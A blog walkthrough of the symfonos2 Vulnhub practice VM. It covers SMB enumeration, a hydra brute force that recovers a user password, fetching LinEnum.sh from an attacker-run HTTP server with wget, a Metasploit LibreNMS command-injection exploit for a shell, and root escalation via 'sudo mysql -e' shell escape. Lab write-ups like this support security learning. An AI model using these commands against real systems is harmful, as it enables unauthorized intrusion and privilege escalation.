---
layout: post
title: "symfonos2 - Vulnhub Boot2Root"
date: 2020-06-28
ctf: true
excerpt: "Walkthrough for the symfonos2 VM"
tags: [vulnhub, symfonos, symfonos2, Boot2Root]
comments: false
---

Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the second box in the series.

## Reconnaissance & Scanning

After importing into VMware Workstation and booting up the machine, I was presented with the IP address of the host.

![symfonos2 ip address](/assets/img/symfonos2-1.png)

This can also be discovered running `netdiscover -i eth0` as shown below:

![symfonos2 netdiscover](/assets/img/symfonos2-2.png)

Now that we have the IP address of the host, we can run **nmap** to find what services are running on the machine.

![symfonos2 nmap](/assets/img/symfonos2-3.png)

As you can see, FTP, SSH, HTTP, and SMB are running on this target host. It also appears that anonymous SMB authentication is allowed. We will first enumerate the shares with **nmap's smb-enum-shares** script as shown below.

![symfonos2 nmap smb-enum-shares](/assets/img/symfonos2-4.png)

It appears that the anonymous user has access to a few shares, let's connect to the anonymous share with `smbclient \\\\192.168.68.138\\anonymous\\ -U anonymous -N`. We are able to successfully connect and there is a backups folder present with a **log.txt** file. Let's retrieve that file with **get**.

![symfonos2 smbclient pilfering](/assets/img/symfonos2-5.png)

This file contains some interesting information. It appears that the **/etc/shadow** file was backed up to **/var/backups/shadow.bak** and that anonymous FTP access is allowed.

![symfonos2 log.txt](/assets/img/symfonos2-6.png)
![symfonos2 log.txt](/assets/img/symfonos2-7.png)

Let's try to connect to the ftp servers as both anonymous and ftp. While these work, it appears that it is looking for a specific email address as a password which we have yet to uncover. Based on research, it appears that this occurs when anonymous FTP isn't configured properly.

![symfonos2 ftp attempt](/assets/img/symfonos2-8.png)

Reviewing the log file a bit further we come across a user account **aeolus**.

![symfonos2 log.txt](/assets/img/symfonos2-9.png)

At this point, I decided to run hydra to see if it was able to recover the password for this user. I elected to attack ftp as we know the aeolus user is running this service so you should be able to login with his credentials once uncovered.

After several minutes, we uncovered the password for **aeolus** which is **sergioteamo**.

![symfonos2 aeolus password](/assets/img/symfonos2-10.png)

We were able to successfully authenticate with these credentials via **ssh**.

![symfonos2 aeolus password](/assets/img/symfonos2-11.png)

Let's do some enumeration. In order to enumerate, let's server up an http server and use **wget** to download Linenum.sh to our victim's computer. The server can be spun up by running `python -m SimpleHTTPServer` and then can be retrieved on the victim's pc with `wget http://192.168.68.135:8000/Linenum.sh`

![symfonos2 python http server](/assets/img/symfonos2-12.png)
![symfonos2 wget](/assets/img/symfonos2-13.png)

Next, we have to make the script executable, which can be done with `chmod 777 LinEnum.sh`

![symfonos2 wget](/assets/img/symfonos2-14.png)

Next, we run LinEnum with the thorough option and with the apache keyword option (as we know this was running from the nmap scan) with `./LinEnum.sh -t -k apache`.

After review, we see that Apache's configuration file is in it's default location of **/etc/apache2/apache2.conf**

![symfonos2 wget](/assets/img/symfonos2-15.png)

Reviewing the Apache configuration file didn't show anything useful, but under the **sites-enabled** folder is another configuration file **librenms.conf**. This appears to be running on localhost only over port 8080 as shown below.

![symfonos2 librenms](/assets/img/symfonos2-16.png)

I wasn't sure what LibreNMS was as I hadn't heard of it, but let's search MetaSploit with ``searchsploit librenms` and see if anything shows up that can be used.

![symfonos2 searchsploit](/assets/img/symfonos2-17.png)

It appears that there are several potential exploits available. However, it appears that LibreNMS is only accessible from localhost. Let's do local SSH port forwarding with `ssh -L 8080:localhost:8080 aeolus@192.168.68.138`. This is one of several tricks related to port forwarding I learned from the SANS GPEN course recently.

![symfonos2 ssh local port forwarding](/assets/img/symfonos2-18.png)

Now we should be able to view this site from a web browser at http://127.0.0.1:8080/

![symfonos2 librenms login](/assets/img/symfonos2-19.png)

Let's try logging in with **aeolus** credentials we uncovered earlier.

![symfonos2 librenms login](/assets/img/symfonos2-20.png)

Success, we were able to login. Let's see if we can exploit this further with Metasploit. Launch Metasploit with the `msfconsole` command and use the `exploit/linux/http/librenms_addhost_cmd_inject` exploit with the options shown below:

![symfonos2 msfconsole librenms exploit](/assets/img/symfonos2-21.png)

Please note, the **LHOST** is the IP address of your attacker computer. Once reviewed with `show options` type in `run` and press enter.

You should now have a new shell to the victim host.

![symfonos2 msfconsole shell](/assets/img/symfonos2-22.png)

Run `python -c 'import pty;pty.spawn("/bin/bash")'` to get an interactive shell. You will see we're logged in as the **cronos** user as well.

![symfonos2 interactive shell](/assets/img/symfonos2-23.png)

Let's run `sudo -l` and see if **cronos** has access to run any programs as root.

![symfonos2 sudo -l](/assets/img/symfonos2-24.png)

Awesome, you can run mysql as root without a password, let's take a look at [GTFOBins]("https://gtfobins.github.io/") and see if there's an exploit that can be used to escalate privileges.

There is a one liner that can be ran `sudo mysql -e '\! /bin/sh'` that should result in root access.

![symfonos2 GTFOBins](/assets/img/symfonos2-25.png)

Let's run it and see what happens.

![symfonos2 root shell](/assets/img/symfonos2-26.png)

It worked! Now you just have to navigate to the root home directory and `cat proof.txt`

![symfonos2 root proof.txt](/assets/img/symfonos2-27.png)
